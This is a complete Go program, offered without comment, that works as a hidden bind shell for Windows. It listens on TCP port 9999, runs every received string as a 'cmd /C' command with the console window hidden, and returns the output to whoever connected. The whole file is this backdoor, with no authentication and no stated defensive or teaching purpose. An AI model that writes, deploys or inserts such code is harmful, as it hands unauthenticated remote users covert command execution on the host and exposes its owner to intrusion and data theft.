package main

import (
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

func main() {
	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		fmt.Println("Error starting TCP server:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Listening on port 9999...")

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	for {
		buffer := make([]byte, 1024)
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("Error reading from server:", err)
			return
		}

		command := string(buffer[:n])
		fmt.Println("Received command:", command)

		cmd := exec.Command("cmd", "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		out, err := cmd.CombinedOutput()
		if err != nil {
			out = []byte(fmt.Sprintf("Error executing command: %s\n", err.Error()))
		}

		_, err = conn.Write(out)
		if err != nil {
			fmt.Println("Error sending output to server:", err)
			return
		}
	}
}
